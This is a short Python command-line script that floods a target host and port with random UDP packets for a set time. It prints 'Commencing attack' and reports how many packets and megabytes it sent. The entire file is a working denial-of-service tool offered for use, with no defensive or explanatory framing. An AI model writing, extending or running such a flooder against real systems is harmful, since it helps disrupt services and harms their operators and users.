#!/usr/bin/python
# -*- coding: utf-8 -*-
import socket
import sys
import time
import random

try:
    sys.argv[4]
except Exception as e:
    print('[Error] Incorrect Usage!')
    print('\tCorrect usage: {host}, {port},  {packet size},  {time}')
    print('\tPlease Note: data cannot be separated by spaces!')
    quit()


class Attack:

    def __init__(
        self,
        host,
        port,
        data,
        time,
        ):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.host = host
        self.port = int(port)
        self.packet_size = int(data)
        self.data = random._urandom(int(data))
        self.time = float(time)

    def attack(self):
        self.packets_sent = 0
        t1 = time.time()
        while True:
            self.sock.sendto(self.data, (self.host, self.port))
            t2 = time.time()
            if t2 - t1 >= self.time:
                break
            self.packets_sent += 1
        print('[+] Attack finished!')
        print('[+]: Results:')
        print('\tPackets sent: {}'.format(self.packets_sent))
        print('\tData sent: {}MB'.format(self.packets_sent
               * self.packet_size / 1000000))
        print('\tAttack Duration: {} seconds'.format(self.time))


if __name__ == '__main__':
    atk = Attack(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
    print('[+] Initialized input data!')
    print('[+] Commencing attack...')
    atk.attack()
